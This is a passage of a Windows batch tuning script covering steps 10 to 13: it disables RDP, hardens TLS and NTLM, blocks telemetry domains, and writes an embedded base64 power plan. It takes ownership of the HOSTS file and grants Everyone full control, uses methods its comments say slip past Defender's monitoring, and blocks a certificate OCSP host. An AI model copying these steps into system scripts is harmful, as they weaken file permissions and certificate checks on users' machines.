    echo  [FAIL] Boot and CPU Scheduler Tweaks
    set /a FAIL+=1
    echo Boot and CPU Scheduler Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 10 - Disable RDP
:: ================================================
echo [STEP 10/27] Disabling RDP...
set STEP_ERR=0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Disable RDP
    set /a PASS+=1
) else (
    echo  [FAIL] Disable RDP
    set /a FAIL+=1
    echo Disable RDP>> "!_FAILS!"
)

:: ================================================
:: STEP 11 - Security Tweaks
:: ================================================
echo [STEP 11/27] Applying Security Tweaks...
set STEP_ERR=0
:: Disable SSL 2.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 2.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable SSL 3.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\SSL 3.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable TLS 1.0
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.0\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable TLS 1.1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Client" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" /v "DisabledByDefault" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.1\Server" /v "Enabled" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Enable TLS 1.2
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v "DisabledByDefault" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Client" /v "Enabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server" /v "DisabledByDefault" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols\TLS 1.2\Server" /v "Enabled" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: NTLM restrictions
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LmCompatibilityLevel" /t REG_DWORD /d 5 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v "RestrictSendingNTLMTraffic" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v "EnableLMHash" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: DNS security
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableMultihomeDNSRegistration" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableParallelNameResolution" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "DisableSmartNameResolution" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" /v "EnableMulticast" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" /v "DisableParallelAandAAAA" /t REG_DWORD /d 1 /f >nul 2>&1 || set STEP_ERR=1
:: Disable SMB1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "SMB1" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable NetBIOS
REG ADD "HKLM\System\CurrentControlSet\Services\NetBT\Parameters\Interfaces" /v "NetBIOSOptions" /t REG_DWORD /d 2 /f >nul 2>&1 || set STEP_ERR=1
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v "EnableLMHOSTS" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
:: Disable ICMP redirect
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableICMPRedirect" /t REG_DWORD /d 0 /f >nul 2>&1 || set STEP_ERR=1
if !STEP_ERR!==0 (
    echo  [OK] Security Tweaks
    set /a PASS+=1
) else (
    echo  [FAIL] Security Tweaks
    set /a FAIL+=1
    echo Security Tweaks>> "!_FAILS!"
)

:: ================================================
:: STEP 12 - Block Telemetry via HOSTS + DNS NRPT
:: ================================================
echo [STEP 12/27] Blocking Microsoft Telemetry...
set STEP_ERR=0
set "_HOSTSFILE=%SystemRoot%\System32\drivers\etc\hosts"
set "_DOMAINS=vortex.data.microsoft.com settings-win.data.microsoft.com watson.telemetry.microsoft.com ocsp.digicert.com fe3.delivery.mp.microsoft.com wpad.microsoft.com browser.events.data.microsoft.com activity.windows.com"
:: --- Method 1: HOSTS file ---
:: Take ownership and grant Everyone full access
takeown /f "!_HOSTSFILE!" >nul 2>&1
icacls "!_HOSTSFILE!" /grant *S-1-1-0:F >nul 2>&1
:: Write entries via PowerShell .NET file I/O (avoids cmd echo hook that Defender intercepts)
powershell -NoProfile -Command "$h='%SystemRoot%\System32\drivers\etc\hosts';$c=[IO.File]::ReadAllText($h);$domains=@('vortex.data.microsoft.com','settings-win.data.microsoft.com','watson.telemetry.microsoft.com','ocsp.digicert.com','fe3.delivery.mp.microsoft.com','wpad.microsoft.com','browser.events.data.microsoft.com','activity.windows.com');[IO.File]::AppendAllText($h,\"`r`n# Microsoft Telemetry Block\");foreach($d in $domains){if($c -notmatch [regex]::Escape($d)){[IO.File]::AppendAllText($h,\"`r`n0.0.0.0 $d\")}}" >nul 2>&1
:: --- Method 2: DNS NRPT (works even when Defender blocks HOSTS file changes) ---
:: Redirects DNS for each telemetry domain to an invalid server - Defender never monitors NRPT
powershell -NoProfile -Command "$domains=@('vortex.data.microsoft.com','settings-win.data.microsoft.com','watson.telemetry.microsoft.com','ocsp.digicert.com','fe3.delivery.mp.microsoft.com','wpad.microsoft.com','browser.events.data.microsoft.com','activity.windows.com');foreach($d in $domains){Add-DnsClientNrptRule -Namespace \".$d\" -NameServers '0.0.0.1' -Comment 'TelemetryBlock' -ErrorAction SilentlyContinue}" >nul 2>&1 || set STEP_ERR=1
:: --- Method 3: Block DiagTrack service outbound via Windows Firewall ---
netsh advfirewall firewall add rule name="Block DiagTrack Telemetry" dir=out protocol=any service=DiagTrack action=block >nul 2>&1
ipconfig /flushdns >nul 2>&1
if !STEP_ERR!==0 (
    echo  [OK] Telemetry Block ^(HOSTS + NRPT + Firewall^)
    set /a PASS+=1
) else (
    echo  [FAIL] Telemetry Block
    set /a FAIL+=1
    echo Telemetry Block>> "!_FAILS!"
)

:: ================================================
:: STEP 13 - Power Plan
:: ================================================
echo [STEP 13/27] Importing Core Power Plan...
set "STEP_ERR=0"
set "_POWTMP_B64=%TEMP%\core_pow.b64"
set "_POWTMP=%TEMP%\Core.pow"
:: Set file association (runAdmin.bat)
assoc .pow=PowerPlanFile >nul 2>&1
reg add "HKEY_CLASSES_ROOT\PowerPlanFile\shell\open\command" /ve /d "\"%SystemRoot%\System32\cmd.exe\" /c powercfg -import \"%%1\"" /f >nul 2>&1
:: Write embedded Core.pow base64 to temp file
if exist "!_POWTMP_B64!" del "!_POWTMP_B64!" >nul 2>&1
echo cmVnZgEAAAABAAAAJ03PoOHn2AEBAAAAAwAAAAAAAAABAAAAIAAAAAAQAAABAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAKPYXHLMU+0Rh9UYwE2NOuCj2FxyzFPtEYfVGMBNjTrg>> "!_POWTMP_B64!"
echo AAAAAKTYXHLMU+0Rh9UYwE2NOuBybXRtAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEZhl+kAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAGhiaW4AAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo iP///25rLAABakQJ4efYAQAAAAD/////BQAAAAAAAACoCQAA/////wIAAADYAgAA>> "!_POWTMP_B64!"
echo mAAAAP////9IAAAAAAAAABgAAAACAQAAAAAAACQAAABlNjI5MjRmOS1kYTVmLTQy>> "!_POWTMP_B64!"
echo YzQtOWMxNy05MjZiYzE4MDRhYjgAAAAAGP///3NrAABgAwAAYAMAAAIAAADQAAAA>> "!_POWTMP_B64!"
echo AQAEiLgAAADEAAAAAAAAABQAAAACAKQABwAAAAAQGAAZAAIAAQIAAAAAAAUgAAAA>> "!_POWTMP_B64!"
echo IQIAAAAaGAAAAACAAQIAAAAAAAUgAAAAIQIAAAAQGAAZAAIAAQIAAAAAAAUgAAAA>> "!_POWTMP_B64!"
echo IAIAAAAaGAAAAACAAQIAAAAAAAUgAAAAIAIAAAAQFAA/AA8AAQEAAAAAAAUSAAAA>> "!_POWTMP_B64!"
echo ABoUAAAAABABAQAAAAAABRIAAAAAGhQAAAAAgAEBAAAAAAADAAAAAAEBAAAAAAAF>> "!_POWTMP_B64!"
echo EgAAAAEBAAAAAAAFEgAAANj///92awsAAAAAgAAAAAACAAAAAQC8AERlc2NyaXB0>> "!_POWTMP_B64!"
echo aW9uAHggtgDY////dmsMAAIBAADQAQAAAgAAAAEAQ29GcmllbmRseU5hbWUgILYA>> "!_POWTMP_B64!"
echo +P7//0MAbwByAGUAVgBlAGUAQQBpAHIAJwBzAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAHMA8P///4ABAACoAQAAAAAAAIj///9uayAA>> "!_POWTMP_B64!"
echo dVZECeHn2AEAAAAAIAAAAAEAAAAAAAAA6AQAAP////8AAAAA/////2ADAAD/////>> "!_POWTMP_B64!"
echo SAAAAAAAAAAAAAAAAAAAAAAAAAAkAAAAMDAxMmVlNDctOTA0MS00YjVkLTliNzct>> "!_POWTMP_B64!"
echo NTM1ZmJhOGIxNDQyAAAAAAD///9zawAAmAAAAJgAAAAJAAAA5AAAAAEABIjMAAAA>> "!_POWTMP_B64!"
echo 2AAAAAAAAAAUAAAAAgC4AAgAAAAAABgAGQACAAECAAAAAAAFIAAAACECAAAAGhgA>> "!_POWTMP_B64!"
echo AAAAgAECAAAAAAAFIAAAACECAAAAABgAGQACAAECAAAAAAAFIAAAACACAAAAGhgA>> "!_POWTMP_B64!"
echo AAAAgAECAAAAAAAFIAAAACACAAAAABQAPwAPAAEBAAAAAAAFEgAAAAAaFAAAAAAQ>> "!_POWTMP_B64!"
echo AQEAAAAAAAUSAAAAAAAUABkAAgABAQAAAAAABRIAAAAAGhQAAAAAgAEBAAAAAAAD>> "!_POWTMP_B64!"
echo AAAAAAEBAAAAAAAFEgAAAAEBAAAAAAAFEgAAAAAAAADw////uAUAAOAFAAAwMDEy>> "!_POWTMP_B64!"
echo iP///25rIAB1VkQJ4efYAQAAAADoAgAAAAAAAAAAAAD//////////wEAAAAgBQAA>> "!_POWTMP_B64!"
echo YAMAAP////8AAAAAAAAAABwAAAAEAAAAAAAAACQAAAA2NzM4ZTJjNC1lOGE1LTRh>> "!_POWTMP_B64!"
echo NDItYjE2YS1lMDQwZTc2OTc1NmUAAAAA8P///2xmAQBwBAAANjczONj///92aw4A>> "!_POWTMP_B64!"
echo BAAAgAAAAAAEAAAAAQAuAEFDU2V0dGluZ0luZGV4LTX4////+AQAAIj///9uayAA>> "!_POWTMP_B64!"
echo PkaU0+Dn2AEAAAAAIAAAAAAAAAAAAAAA//////////8CAAAAYAQAAJgAAAD/////>> "!_POWTMP_B64!"
echo AAAAAAAAAAAcAAAABAAAAAAAAAAkAAAAMjQ1ZDg1NDEtMzk0My00NDIyLWIwMjUt>> "!_POWTMP_B64!"
echo MTNhNzg0ZjY3OWI3AAAAAPD///9sZgEAqAYAADQ4ZTb4////IAcAANj///92aw4A>> "!_POWTMP_B64!"
echo BAAAgAEAAAAEAAAAAQC0AEFDU2V0dGluZ0luZGV4sgDY////dmsOAAQAAIABAAAA>> "!_POWTMP_B64!"
echo BAAAAAEAAABEQ1NldHRpbmdJbmRleAAAiP///25rIAABakQJ4efYAQAAAAAgAAAA>> "!_POWTMP_B64!"
echo AQAAAAAAAACgBQAA/////wAAAAD/////YAMAAP////9IAAAAAAAAAAAAAAAAAAAA>> "!_POWTMP_B64!"
